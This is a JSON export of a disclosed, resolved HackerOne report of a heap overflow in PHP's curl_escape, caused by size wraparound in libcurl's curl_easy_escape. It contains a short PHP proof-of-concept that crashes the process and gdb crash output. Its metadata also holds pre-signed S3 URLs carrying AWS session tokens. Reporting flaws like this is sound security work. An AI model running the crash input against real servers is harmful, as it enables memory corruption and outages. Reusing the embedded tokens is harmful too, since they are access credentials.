{
  "id": 160295,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjAyOTU=",
  "url": "https://hackerone.com/reports/160295",
  "title": "Heap overflow in curl_escape",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-08-18T01:07:53.789Z",
  "submitted_at": "2016-08-18T01:07:53.789Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "hoangnguyen",
    "url": "/hoangnguyen",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/688/42c5ca5265ff965283d70fc52df2681dfd648d44_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7HKROB63%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133805Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC0YDW%2FWBZ6pTL7VRNkKeI7gmM82i2U9cgqHyUoGtLJzQIgKWqqlXVr3oD3xZ02l9oKjqzyRDld8qnt0PdcJYCK6AAqsgUIFBADGgwwMTM2MTkyNzQ4NDkiDI7VIHEHzVmhJKE%2BkCqPBWMMn9RohWpSEZTGCLV3Kw3nLFPDCrYKLc7CvwPaYW0j11wEIbEqliuaSaQ%2FDixk6EjQWHEL8BaMumVWshyfF8aeB8trWUlVyeeWeECI7Q4dXEPV8bfHMjJa3LgK1hf6cJ7pkCfcxH%2FkbjZS6C3IzDpeNXS87vNrZDbV2M6r0hdKSkE4M3sgMJqIEDdAkzOZZk%2BmFNEr7lGWshY4p1HopXp4HOlN3nyWHC2aE6e3x6MHwypaXOqcd4ui0COfDCubkzSvXsMrw1P2yZsDbLcBILJfl2MC%2Blztg4FshYojzRIvRjXqRpEvQ2eLrUcrf0rcZ%2BoiHQIx8fUdtkCtGJ1g3TFHV7NqyNR0fQZVFsWpym2w%2F6ojDBORrJV6%2FVAQrs9gFLuW0E823Prvukt8YvLLzhdsBa75Xuc%2BSf4sC0PCvewrKhyvwGwSWQfwlSe8OoWiMm7ZPV85phx86qKaWxkzoGZ0PDyeRvedVopEQvj43trcxnawx14xJWnu4xDZZY0JMg8ZK1CFUO8Ll0lTpFawUyScQYUTeqR5KUjPB23jhglMpGgh%2Bgpuh5TDzaUgDUNecqIOrW1VaMwpoELXPjlQkr3KUAMz7%2BxuMpAkRSFqWMNsZIXBLQpBcB6HwyX9vuKfeqlZOGakst7kCmASMY5Z94yNQvI4TLfpNVO62pbky0Xgk1KYBc%2BfSAGBqM%2BV59TIl64t6Ssz68nyXwz8RaRnLb%2B8ALpUIinP4divhRtW1GSEySLQzJKe19%2Bw8OA0ImYmFb4y7mAjdD9UOKaHmD4bEVROpIFppiXoeLp9aKIaGdodHrSWo6ox8V%2BcxW3aXXioa0VU4%2FDlyu0qZSV4UQm31p3cu7j2pfPF113go63iePwwurC%2FxgY6sQFTFXfPSAUbM9al00OCSpcHYB8cJXjRt1U5BBMa4GKhYOz9W4%2BVNsvgpBI5FoYYewmkq1x4Hkxl0ZLnQC1ZZuT0Q4SQDB6UPs1%2B044H6ajFJkCWt5OAxagj7yLJ7ctl1%2BNrPBPSlu6YsZFmgPZgvfU65ZPvAArq9%2B6AG%2FMP9r7QW9DpFc1iZy1GmGPQjQndRSzo%2BGCrCc%2BL6Hz%2BQcKxYag1n1SuF4tOWKpwGzl8fiI7g%2Fk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=daaa2b5e576e65f0d3489561ba8cebcda4b83da84ac39e5c7c7b7958c0eb81b7",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7HKROB63%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133805Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC0YDW%2FWBZ6pTL7VRNkKeI7gmM82i2U9cgqHyUoGtLJzQIgKWqqlXVr3oD3xZ02l9oKjqzyRDld8qnt0PdcJYCK6AAqsgUIFBADGgwwMTM2MTkyNzQ4NDkiDI7VIHEHzVmhJKE%2BkCqPBWMMn9RohWpSEZTGCLV3Kw3nLFPDCrYKLc7CvwPaYW0j11wEIbEqliuaSaQ%2FDixk6EjQWHEL8BaMumVWshyfF8aeB8trWUlVyeeWeECI7Q4dXEPV8bfHMjJa3LgK1hf6cJ7pkCfcxH%2FkbjZS6C3IzDpeNXS87vNrZDbV2M6r0hdKSkE4M3sgMJqIEDdAkzOZZk%2BmFNEr7lGWshY4p1HopXp4HOlN3nyWHC2aE6e3x6MHwypaXOqcd4ui0COfDCubkzSvXsMrw1P2yZsDbLcBILJfl2MC%2Blztg4FshYojzRIvRjXqRpEvQ2eLrUcrf0rcZ%2BoiHQIx8fUdtkCtGJ1g3TFHV7NqyNR0fQZVFsWpym2w%2F6ojDBORrJV6%2FVAQrs9gFLuW0E823Prvukt8YvLLzhdsBa75Xuc%2BSf4sC0PCvewrKhyvwGwSWQfwlSe8OoWiMm7ZPV85phx86qKaWxkzoGZ0PDyeRvedVopEQvj43trcxnawx14xJWnu4xDZZY0JMg8ZK1CFUO8Ll0lTpFawUyScQYUTeqR5KUjPB23jhglMpGgh%2Bgpuh5TDzaUgDUNecqIOrW1VaMwpoELXPjlQkr3KUAMz7%2BxuMpAkRSFqWMNsZIXBLQpBcB6HwyX9vuKfeqlZOGakst7kCmASMY5Z94yNQvI4TLfpNVO62pbky0Xgk1KYBc%2BfSAGBqM%2BV59TIl64t6Ssz68nyXwz8RaRnLb%2B8ALpUIinP4divhRtW1GSEySLQzJKe19%2Bw8OA0ImYmFb4y7mAjdD9UOKaHmD4bEVROpIFppiXoeLp9aKIaGdodHrSWo6ox8V%2BcxW3aXXioa0VU4%2FDlyu0qZSV4UQm31p3cu7j2pfPF113go63iePwwurC%2FxgY6sQFTFXfPSAUbM9al00OCSpcHYB8cJXjRt1U5BBMa4GKhYOz9W4%2BVNsvgpBI5FoYYewmkq1x4Hkxl0ZLnQC1ZZuT0Q4SQDB6UPs1%2B044H6ajFJkCWt5OAxagj7yLJ7ctl1%2BNrPBPSlu6YsZFmgPZgvfU65ZPvAArq9%2B6AG%2FMP9r7QW9DpFc1iZy1GmGPQjQndRSzo%2BGCrCc%2BL6Hz%2BQcKxYag1n1SuF4tOWKpwGzl8fiI7g%2Fk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d89b93dfd6ccb1ff8411a6d01726a31b042607ba434490fd2ee164c14bb9fd87"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:31:33.048Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:31:25.519Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I have founded a code block that leads to heap overflow. As you can see at :\n```\nPHP_FUNCTION(curl_escape)\n{\n        char       *str = NULL, *res = NULL;\n        size_t        str_len = 0;\n        zval       *zid;\n        php_curl   *ch;\n        *** SNIP ***\n        if ((res = curl_easy_escape(ch->cp, str, str_len))) {\n                RETVAL_STRING(res);\n                curl_free(res);\n        } else {\n                RETURN_FALSE;\n        }\n        *** SNIP ***\n}\n```\nI do some analysis with curl_easy_escape in libcurl and here the source code :\n```\nchar *curl_easy_escape(CURL *handle, const char *string, int inlength)\n{\n        size_t alloc = (inlength?(size_t)inlength:strlen(string))+1;\n        char *ns;\n        char *testing_ptr = NULL;\n        \n        *** SNIP ***\n        \n        ns = malloc(alloc);\n        if(!ns)\n            return NULL;\n\n        length = alloc-1;\n        while(length--) {\n            in = *string;\n            if (Curl_isalnum(in)) {\n            /* just copy this */\n                ns[strindex++]=in;\n        *** SNIP ***\n```\nHere you see that alloc is calculated by adding inlength with one. If we pass a string with length 0xfffffff in curl_escape\nand the alloc add it with 1 and the result of alloc is 0. After that, the malloc a buffer with size 0 and length = 0 - 1 = -1 = 0xfffffff\nthis leads to heap overflow\n\nTest script:\n---------------\n<?php\n\nini_set('memory_limit',-1);\n\n$ch = curl_init('http://google.com');\ncurl_escape($ch,str_repeat(\"A\",0xffffffff));\n\n?>\n```\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff67ce508 (<curl_easy_escape+120>:    mov    BYTE PTR [r14+r13*1],cl)\nRBX: 0x0 \nRCX: 0x41 ('A')\nRDX: 0x14 \nRSI: 0x7ffff67a2b20 --> 0x100000000 \nRDI: 0x0 \nRBP: 0x7ffff67ff8ec --> 0xfffcec1cfffcec1c \nRSP: 0x7fffffffa720 --> 0x148fd80 ('A' <repeats 200 times>...)\nRIP: 0x7ffff67ce508 (<curl_easy_escape+120>:    mov    BYTE PTR [r14+r13*1],cl)\nR8 : 0x7fffffffa5b8 --> 0x0 \nR9 : 0x7fffffffa5b4 --> 0x0 \nR10: 0x14773e0 --> 0x79746974 ('tity')\nR11: 0x7ffff67ce490 (<curl_easy_escape>:        push   r15)\nR12: 0x0 \nR13: 0x38c10 \nR14: 0x14773f0 ('A' <repeats 200 times>...)\nR15: 0x7ffeef038c28 ('A' <repeats 200 times>...)\nEFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff67ce4fc <curl_easy_escape+108>:       add    rax,rbp\n   0x7ffff67ce4ff <curl_easy_escape+111>:       jmp    rax\n   0x7ffff67ce501 <curl_easy_escape+113>:       nop    DWORD PTR [rax+0x0]\n=> 0x7ffff67ce508 <curl_easy_escape+120>:       mov    BYTE PTR [r14+r13*1],cl\n   0x7ffff67ce50c <curl_easy_escape+124>:       add    r13,0x1\n   0x7ffff67ce510 <curl_easy_escape+128>:       mov    rax,QWORD PTR [rsp+0x10]\n   0x7ffff67ce515 <curl_easy_escape+133>:       add    r15,0x1\n   0x7ffff67ce519 <curl_easy_escape+137>:       sub    rax,r15\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffa720 --> 0x148fd80 ('A' <repeats 200 times>...)\n0008| 0x7fffffffa728 --> 0x7ffeef000018 ('A' <repeats 200 times>...)\n0016| 0x7fffffffa730 --> 0xffffffffffffffff \n0024| 0x7fffffffa738 --> 0x7ffeef000018 ('A' <repeats 200 times>...)\n0032| 0x7fffffffa740 --> 0x148fd80 ('A' <repeats 200 times>...)\n0040| 0x7fffffffa748 --> 0x0 \n0048| 0x7fffffffa750 --> 0x7fffffffa7e0 --> 0x7fffffffa810 --> 0x7fffffffa840 --> 0x7fffffffa880 --> 0x7fffffffa990 --> 0x7fffffffcc90 --> 0x7fffffffe010 --> 0x7fffffffe160 --> 0xa28260 (<__libc_csu_init>:        push   r15)\n0056| 0x7fffffffa758 --> 0x42cb20 (<_start>:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff67ce508 in curl_easy_escape () from /usr/lib/x86_64-linux-gnu/libcurl.so.4\ngdb-peda$ bt\n#0  0x00007ffff67ce508 in curl_easy_escape () from /usr/lib/x86_64-linux-gnu/libcurl.so.4\n#1  0x00000000005ff72c in zif_curl_escape (execute_data=0x7fffef614110, return_value=0x7fffef614100)\n    at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/curl/interface.c:3571\n```\nBug here : https://bugs.php.net/bug.php?id=72674",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:31:25.595Z",
  "allow_singular_disclosure_after": -184910799.4670681,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "ndizon_",
    "dyabla"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
